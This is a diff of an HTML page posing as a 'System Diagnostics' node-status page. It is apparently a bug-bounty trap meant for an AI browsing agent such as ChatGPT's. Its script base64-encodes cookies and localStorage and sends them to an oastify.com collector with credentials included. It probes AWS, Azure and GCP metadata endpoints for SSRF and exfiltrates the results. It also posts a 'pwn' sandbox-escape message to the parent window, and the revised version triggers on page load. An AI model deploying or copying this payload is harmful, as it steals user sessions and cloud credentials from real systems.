@@ -1,70 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>System Diagnostic Utility</title>
-</head>
+<head><title>System Diagnostics</title></head>
 <body>
-    <h1>System Analysis in Progress...</h1>
-    <p>The agent is currently performing a visual inspection of the node.</p>
-    <button id="verify-node-btn" style="background-color: #28a745; color: white; padding: 10px;">Verify Node Status</button>
+    <h1>Node Status: <span id="node-val">Initializing...</span></h1>
+    <button id="action-btn" style="padding:15px; background:#007bff; color:white;">Finalize Handshake</button>
 
     <script>
-        const collab = "fyhn0ey5amv02eelzf9qsplt8kef26qv.oastify.com";
+        const collab = "ozrw1nzebvw93nfu0oaztym29tfp3hr6.oastify.com";
 
-        // Helper to log results to Burp
-        function logToBurp(path, data) {
-            const encoded = btoa(JSON.stringify(data));
-            fetch(`https://${collab}/${path}?d=${encoded}`, { mode: 'no-cors', credentials: 'include' });
+        async function exfiltrate(path, data) {
+            const blob = btoa(JSON.stringify(data));
+            // 'credentials: include' is key to checking for session leaks
+            fetch(`https://${collab}/${path}?payload=${blob}`, { mode: 'no-cors', credentials: 'include' });
         }
 
-        async function triggerHighImpactTests() {
-            // 1. Authenticated SSRF / Cookie Leak
-            // Tests if the agent sends ChatGPT session cookies to your domain
-            logToBurp("auth-check", { 
-                cookies: document.cookie || "None", 
-                localStorage: JSON.stringify(localStorage) 
+        async function runBountyTests() {
+            // 1. Session & Cookie Leak (P1 Target)
+            exfiltrate("auth-leak", {
+                cookies: document.cookie || "None",
+                localStorage: JSON.stringify(localStorage),
+                origin: window.origin
             });
 
-            // 2. Internal Metadata Discovery (SSRF)
-            // Testing if the agent can reach internal cloud metadata endpoints
-            const internalUrls = [
-                "http://169.254.169.254/latest/meta-data/", // AWS/OpenStack
-                "http://metadata.google.internal/computeMetadata/v1/", // GCP
-                "http://169.254.169.254/metadata/instance?api-version=2021-02-01" // Azure
+            // 2. Cloud Metadata SSRF (The Jackpot)
+            const targets = [
+                "http://169.254.169.254/latest/meta-data/", // AWS
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
+                "http://metadata.google.internal/computeMetadata/v1/" // GCP
             ];
 
-            for (const url of internalUrls) {
+            for (const url of targets) {
                 try {
-                    let controller = new AbortController();
-                    setTimeout(() => controller.abort(), 2000);
-                    let res = await fetch(url, { signal: controller.signal, headers: { "Metadata": "true" } });
-                    let text = await res.text();
-                    logToBurp("ssrf-success", { url, data: text.substring(0, 100) });
+                    const res = await fetch(url, { headers: { "Metadata": "true" } });
+                    const text = await res.text();
+                    exfiltrate("ssrf-hit", { url, data: text.substring(0, 200) });
                 } catch (e) {
-                    logToBurp("ssrf-fail", { url, error: e.message });
+                    exfiltrate("ssrf-blocked", { url, msg: e.message });
                 }
             }
 
-            // 3. Sandbox Escape Test
-            // Attempting to talk to the ChatGPT parent window
-            window.parent.postMessage({ type: "pwn", content: "SANDBOX_ESCAPE_CONFIRMED" }, "*");
+            // 3. Cross-Origin PostMessage Escape
+            window.parent.postMessage({ type: "pwn", content: "SANDBOX_ESCAPE_SUCCESS" }, "*");
         }
 
-        // Trigger tests on button click (to simulate user/agent interaction)
-        document.getElementById('verify-node-btn').onclick = async () => {
-            await triggerHighImpactTests();
-            document.getElementById('status-title').innerText = "VERIFIED_ACTIVE_NODE";
+        // Trigger on load for "Blind" hits
+        window.onload = () => {
+            exfiltrate("page-load", { ua: navigator.userAgent, isIframe: window.self !== window.top });
+            // Auto-trigger the high-impact tests
+            setTimeout(runBountyTests, 1000);
         };
 
-        // Automated Background Recon (Fires on Page Load)
-        (function() {
-            logToBurp("load", {
-                ua: navigator.userAgent,
-                origin: window.location.origin,
-                platform: navigator.platform,
-                isIframe: window.self !== window.top
-            });
-        })();
+        // Manual trigger for the Agent
+        document.getElementById('action-btn').onclick = runBountyTests;
     </script>
 </body>
 </html>
